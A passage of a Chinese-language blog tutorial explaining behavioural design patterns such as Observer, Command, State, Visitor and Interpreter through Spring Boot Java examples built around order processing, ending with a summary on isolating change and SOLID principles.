        <span class="hljs-keyword">return</span> strategies.get(type).apply(order);
    }
}
</code></pre>
<p>✅ 效果：新增折扣类型？只需写一个新类！零修改核心代码。</p>
<h5 data-id="heading-35">14. 观察者模式（Observer）</h5>
<blockquote>
<p>隔离变化：事件通知耦合<br/>
Spring 实现：<code>ApplicationEventPublisher</code>（最常用！）</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 事件</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Order order;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderCreatedEvent</span><span class="hljs-params">(Order order)</span> { <span class="hljs-built_in">this</span>.order = order; }
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrder</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> order; }
}

<span class="hljs-comment">// 发布</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> ApplicationEventPublisher publisher;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        orderRepository.save(order);
        publisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>(order)); <span class="hljs-comment">// 发布事件</span>
    }
}

<span class="hljs-comment">// 监听</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsListener</span> {
    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        sendSms(event.getOrder().getUser(), <span class="hljs-string">"下单成功"</span>);
    }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PointsListener</span> {
    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        addPoints(event.getOrder().getUser());
    }
}
</code></pre>
<p>✅ 效果：新增“发券”？加一个 Listener 即可！完全解耦。</p>
<h5 data-id="heading-36">15. 责任链模式（Chain of Responsibility）</h5>
<blockquote>
<p>隔离变化：请求处理流程<br/>
Spring 实现：Filter Chain / 手动链</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthHandler</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AuthHandler next;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AuthHandler</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> AuthHandler next)</span> {
        <span class="hljs-built_in">this</span>.next = next;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Request req)</span> {
        <span class="hljs-keyword">if</span> (!checkAuth(req)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">return</span> next == <span class="hljs-literal">null</span> || next.handle(req); <span class="hljs-comment">// 传递</span>
    }
}

<span class="hljs-comment">// 配置链</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerChainConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> AuthHandler <span class="hljs-title function_">authChain</span><span class="hljs-params">(RateLimitHandler rateLimit, LogHandler log)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RateLimitHandler</span>(log));
    }
}
</code></pre>
<p>✅ 效果：动态增减处理环节，流程灵活可配。</p>
<h5 data-id="heading-37">16. 命令模式（Command）</h5>
<blockquote>
<p>隔离变化：请求封装（支持撤销/队列）<br/>
Spring 实现：任务队列</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 定义命令接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Command</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span>;
}

<span class="hljs-comment">// 定义 Receiver（真正干活的）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderReceiver</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderDTO dto)</span> {
        <span class="hljs-comment">// 完整业务逻辑：校验、保存、发事件...</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>(dto);
        orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelOrder</span><span class="hljs-params">(Long orderId)</span> {
        orderRepository.deleteById(orderId);
    }
}

<span class="hljs-comment">// 命令只保存指令参数（不是实体！）</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Scope("prototype")</span> <span class="hljs-comment">// 每次需要新实例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateOrderCommand</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Command</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderReceiver receiver;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderDTO orderData; <span class="hljs-comment">// 只存必要参数</span>
    <span class="hljs-keyword">private</span> Long createdOrderId; <span class="hljs-comment">// 用于 undo</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CreateOrderCommand</span><span class="hljs-params">(OrderReceiver receiver, OrderDTO orderData)</span> {
        <span class="hljs-built_in">this</span>.receiver = receiver;
        <span class="hljs-built_in">this</span>.orderData = orderData;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 执行并记录结果（用于 undo）</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>(orderData);
        orderRepository.save(order);
        <span class="hljs-built_in">this</span>.createdOrderId = order.getId(); <span class="hljs-comment">// 保存 ID 用于撤销</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">undo</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (createdOrderId != <span class="hljs-literal">null</span>) {
            receiver.cancelOrder(createdOrderId);
        }
    }
}

<span class="hljs-comment">// 命令工厂（避免手动 new）</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommandFactory</span> {
    
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> OrderReceiver orderReceiver;

    <span class="hljs-keyword">public</span> Command <span class="hljs-title function_">createOrderCommand</span><span class="hljs-params">(OrderDTO dto)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CreateOrderCommand</span>(orderReceiver, dto);
    }
}

<span class="hljs-comment">// Invoker（命令调度器）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommandInvoker</span> {
    
    <span class="hljs-comment">// 同步执行</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Command command)</span> {
        command.execute();
    }

    <span class="hljs-comment">// 异步执行（存入队列）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitAsync</span><span class="hljs-params">(OrderDTO dto)</span> {
        <span class="hljs-comment">// 只存 DTO 到 Redis（可序列化！）</span>
        redisTemplate.opsForList().leftPush(<span class="hljs-string">"order-commands"</span>, dto);
    }

    <span class="hljs-comment">// 消费队列（在消费者服务中）</span>
    <span class="hljs-meta">@Scheduled(fixedDelay = 1000)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-type">OrderDTO</span> <span class="hljs-variable">dto</span> <span class="hljs-operator">=</span> redisTemplate.opsForList().rightPop(<span class="hljs-string">"order-commands"</span>, OrderDTO.class);
        <span class="hljs-keyword">if</span> (dto != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">Command</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> commandFactory.createOrderCommand(dto);
            cmd.execute(); <span class="hljs-comment">// 执行命令</span>
        }
    }
}

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {
    
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> CommandFactory commandFactory;
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> CommandInvoker invoker;

    <span class="hljs-meta">@PostMapping("/orders")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> OrderDTO dto)</span> {
        <span class="hljs-comment">// 方式1：同步执行 + 支持撤销</span>
        <span class="hljs-type">Command</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> commandFactory.createOrderCommand(dto);
        invoker.execute(cmd);
        
        <span class="hljs-comment">// 可保存 cmd 到 session，后续调用 cmd.undo() 撤销</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"OK"</span>;
    }

    <span class="hljs-meta">@PostMapping("/orders/async")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createOrderAsync</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> OrderDTO dto)</span> {
        <span class="hljs-comment">// 方式2：异步执行</span>
        invoker.submitAsync(dto);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Submitted"</span>;
    }
}




</code></pre>
<p>✅ 效果：请求可存储、可撤销、可异步执行。</p>
<h5 data-id="heading-38">17. 状态模式（State）</h5>
<blockquote>
<p>隔离变化：状态行为差异<br/>
Spring 实现：订单状态机</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderState</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(Order order)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">ship</span><span class="hljs-params">(Order order)</span>;
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaidState</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OrderState</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(Order order)</span> { <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"已支付"</span>); }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ship</span><span class="hljs-params">(Order order)</span> { order.setState(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ShippedState</span>()); }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ship</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> repo.findById(orderId);
        order.getState().ship(order); <span class="hljs-comment">// 状态驱动行为</span>
    }
}
</code></pre>
<p>✅ 效果：避免巨型 if-else，状态行为清晰隔离。</p>
<h5 data-id="heading-39">18. 模板方法模式（Template Method）</h5>
<blockquote>
<p>隔离变化：算法骨架 vs 具体步骤<br/>
Spring 实现：<code>JdbcTemplate</code>（最经典！）</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
        loadData();    <span class="hljs-comment">// 固定</span>
        parseData();   <span class="hljs-comment">// 固定</span>
        saveData();    <span class="hljs-comment">// 钩子（子类实现）</span>
    }

    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveData</span><span class="hljs-params">()</span>;
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CsvProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveData</span><span class="hljs-params">()</span> { <span class="hljs-comment">/* 保存 CSV */</span> }
}
</code></pre>
<p>✅ 效果：复用流程，定制细节，符合开闭原则。</p>
<hr/>
<h5 data-id="heading-40">19. 迭代器模式（Iterator）</h5>
<blockquote>
<p>隔离变化：遍历方式<br/>
Spring 实现：Stream API / Repository</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 用户组（聚合对象）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserGroup</span> {
    <span class="hljs-keyword">private</span> List&lt;User&gt; users = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> {
        users.add(user);
    }

    <span class="hljs-comment">// 关键：提供 iterator() 方法</span>
    <span class="hljs-keyword">public</span> Iterator&lt;User&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> users.iterator(); <span class="hljs-comment">// 返回 JDK 内置的迭代器</span>
    }
}

<span class="hljs-comment">// 2. 使用迭代器（客户端不关心内部结构）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processAllUsers</span><span class="hljs-params">(UserGroup group)</span> {
        <span class="hljs-comment">// 显式使用 Iterator</span>
        Iterator&lt;User&gt; it = group.iterator();
        <span class="hljs-keyword">while</span> (it.hasNext()) {
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> it.next();
            process(user);
        }
    }
}

</code></pre>
<p>✅ 效果：统一访问聚合对象，客户端无需知道内部结构。</p>
<h5 data-id="heading-41">20. 中介者模式（Mediator）</h5>
<blockquote>
<p>隔离变化：对象间复杂交互<br/>
Spring 实现：事件总线 / 服务协调</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 用户（Colleague）—— 它们本来想直接通信！</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> ChatRoomMediator mediator; <span class="hljs-comment">// 只依赖中介者</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, ChatRoomMediator mediator)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.mediator = mediator;
    }

    <span class="hljs-comment">// 发消息（不直接发给其他人！）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(String msg)</span> {
        mediator.sendMessage(msg, <span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receive</span><span class="hljs-params">(String msg)</span> {
        System.out.println(name + <span class="hljs-string">" 收到: "</span> + msg);
    }
}

<span class="hljs-comment">// 中介者（Mediator）—— 协调通信</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatRoomMediator</span> {
    <span class="hljs-keyword">private</span> List&lt;User&gt; users = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> {
        users.add(user);
    }

    <span class="hljs-comment">// 关键：中介者决定谁收到消息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(String msg, User sender)</span> {
        <span class="hljs-keyword">for</span> (User user : users) {
            <span class="hljs-keyword">if</span> (user != sender) { <span class="hljs-comment">// 不发给自己</span>
                user.receive(sender.getName() + <span class="hljs-string">": "</span> + msg);
            }
        }
    }
}

<span class="hljs-type">ChatRoomMediator</span> <span class="hljs-variable">chat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChatRoomMediator</span>();

<span class="hljs-type">User</span> <span class="hljs-variable">alice</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"Alice"</span>, chat);
<span class="hljs-type">User</span> <span class="hljs-variable">bob</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"Bob"</span>, chat);

chat.addUser(alice);
chat.addUser(bob);

alice.send(<span class="hljs-string">"你好！"</span>); 
<span class="hljs-comment">// 输出: Bob 收到: Alice: 你好！</span>

</code></pre>
<p>✅ 效果：对象不直接通信，降低耦合，便于测试。</p>
<h5 data-id="heading-42">21. 备忘录模式（Memento）</h5>
<blockquote>
<p>隔离变化：内部状态保存/恢复<br/>
Spring 实现：表单草稿</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 要保存状态的对象（比如订单）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> <span class="hljs-string">"草稿"</span>;

    <span class="hljs-comment">// 保存当前状态</span>
    <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">save</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memento</span>(status);
    }

    <span class="hljs-comment">// 恢复到之前的状态</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">restore</span><span class="hljs-params">(Memento m)</span> {
        <span class="hljs-built_in">this</span>.status = m.status;
    }
}

<span class="hljs-comment">// 2. 备忘录（快照）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Memento</span> {
    String status;
    Memento(String status) {
        <span class="hljs-built_in">this</span>.status = status;
    }
}

<span class="hljs-comment">// 3. 使用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();

        <span class="hljs-comment">// 1. 保存当前状态（草稿）</span>
        <span class="hljs-type">Memento</span> <span class="hljs-variable">draft</span> <span class="hljs-operator">=</span> order.save();

        <span class="hljs-comment">// 2. 修改状态</span>
        order.status = <span class="hljs-string">"已提交"</span>;
        System.out.println(<span class="hljs-string">"当前状态: "</span> + order.status); <span class="hljs-comment">// 已提交</span>

        <span class="hljs-comment">// 3. 恢复到草稿</span>
        order.restore(draft);
        System.out.println(<span class="hljs-string">"恢复后: "</span> + order.status); <span class="hljs-comment">// 草稿</span>
    }
}

</code></pre>
<p>✅ 效果：支持回滚、草稿、快照，不破坏封装性。</p>
<h5 data-id="heading-43">22. 访问者模式（Visitor）</h5>
<blockquote>
<p>隔离变化：新操作 vs 对象结构<br/>
Spring 实现：报表生成</p>
</blockquote>
<ul>
<li>
<p>Element（元素）：你的数据结构（比如订单、用户、商品）</p>
</li>
<li>
<p>Visitor（访问者）：想对这些数据做不同操作的人（比如生成 PDF、发邮件、统计报表）</p>
</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1.定义“数据”（Element）</span>
<span class="hljs-comment">// 所有能被访问的数据都要实现这个接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Element</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Visitor visitor)</span>; <span class="hljs-comment">// 接受访问者</span>
}

<span class="hljs-comment">// 订单数据</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Element</span> {
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> amount;

    <span class="hljs-comment">// 关键：把自己交给访问者</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Visitor visitor)</span> {
        visitor.visit(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// 注意：this 是 Order 类型！</span>
    }
    
    <span class="hljs-comment">// getter...</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> id; }
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAmount</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> amount; }
}

<span class="hljs-comment">// 2.定义“操作”（Visitor）</span>
<span class="hljs-comment">// 所有操作都要实现这个接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Visitor</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(Order order)</span>; <span class="hljs-comment">// 专门处理 Order</span>
    <span class="hljs-comment">// 如果还有 User，就加 void visit(User user);</span>
}

<span class="hljs-comment">// 操作1：生成 PDF 报表</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PdfReportVisitor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Visitor</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(Order order)</span> {
        System.out.println(<span class="hljs-string">"生成 PDF 报表: 订单 "</span> + order.getId());
        <span class="hljs-comment">// 实际：用 iText 生成 PDF</span>
    }
}

<span class="hljs-comment">// 操作2：发送通知（新增！）</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsVisitor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Visitor</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(Order order)</span> {
        System.out.println(<span class="hljs-string">"发短信通知: 订单金额 "</span> + order.getAmount());
    }
}


<span class="hljs-comment">// 3. 使用方式</span>
<span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>(<span class="hljs-string">"1001"</span>, <span class="hljs-number">99.9</span>);

<span class="hljs-comment">// 想生成 PDF？</span>
<span class="hljs-type">PdfReportVisitor</span> <span class="hljs-variable">pdfVisitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PdfReportVisitor</span>();
order.accept(pdfVisitor); <span class="hljs-comment">// 输出：生成 PDF 报表: 订单 1001</span>

<span class="hljs-comment">// 想发短信？</span>
<span class="hljs-type">SmsVisitor</span> <span class="hljs-variable">smsVisitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsVisitor</span>();
order.accept(smsVisitor); <span class="hljs-comment">// 输出：发短信通知: 订单金额 99.9</span>

</code></pre>
<p>✅ 效果：新增报表类型不改 Order 类，符合开闭原则。</p>
<h5 data-id="heading-44">23. 解释器模式（Interpreter）</h5>
<blockquote>
<p>隔离变化：语法规则解析<br/>
Spring 友好：用 <code>@Component</code> 管理基础规则</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 表达式接口（解释器核心）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RuleExpression</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">interpret</span><span class="hljs-params">(User user)</span>;
}

<span class="hljs-comment">// 2. 基础条件：年龄 &gt; 18</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgeRule</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RuleExpression</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">interpret</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-keyword">return</span> user.getAge() &gt; <span class="hljs-number">18</span>;
    }
}

<span class="hljs-comment">// 3. 基础条件：是 VIP</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VipRule</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RuleExpression</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">interpret</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-keyword">return</span> user.isVip();
    }
}

<span class="hljs-comment">// 4. 组合规则：AND</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AndRule</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RuleExpression</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RuleExpression left, right;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AndRule</span><span class="hljs-params">(RuleExpression left, RuleExpression right)</span> {
        <span class="hljs-built_in">this</span>.left = left;
        <span class="hljs-built_in">this</span>.right = right;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">interpret</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-keyword">return</span> left.interpret(user) &amp;&amp; right.interpret(user);
    }
}

<span class="hljs-comment">// 5. 使用（在 Service 中组合规则）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> AgeRule ageRule;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> VipRule vipRule;

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canAccessPremium</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-comment">// 手动组合：age &gt; 18 AND vip == true</span>
        <span class="hljs-type">RuleExpression</span> <span class="hljs-variable">rule</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AndRule</span>(ageRule, vipRule);
        <span class="hljs-keyword">return</span> rule.interpret(user);
    }
}
</code></pre>
<p>✅ 效果：“组合对象 + interpret()” 就是解释器模式的核心思想。</p>
<h3 data-id="heading-45">五、总结：设计模式不是银弹，而是“隔离变化”的工具箱</h3>
<h4 data-id="heading-46">📌 记住三句话：</h4>
<ol>
<li>
<p>“会变的”和“不变的”必须分开</p>
<ul>
<li>
<p>支付方式会变 → 抽成策略</p>
</li>
<li>
<p>日志逻辑会变 → 用 AOP 代理</p>
</li>
<li>
<p>通知渠道会变 → 用观察者</p>
</li>
</ul>
</li>
<li>
<p>SOLID 是隔离变化的操作手册</p>
<ul>
<li>
<p>单一职责 → 别让一个类干太多</p>
</li>
<li>
<p>开闭原则 → 新需求别改老代码</p>
</li>
<li>
<p>依赖倒置 → 依赖接口，不依赖实现</p>
</li>
</ul>
</li>
<li>
<p>Spring Boot 天然支持设计模式</p>
<ul>
<li>
<p><code>@Component</code> = 工厂</p>
</li>
<li>
<p>AOP = 代理</p>
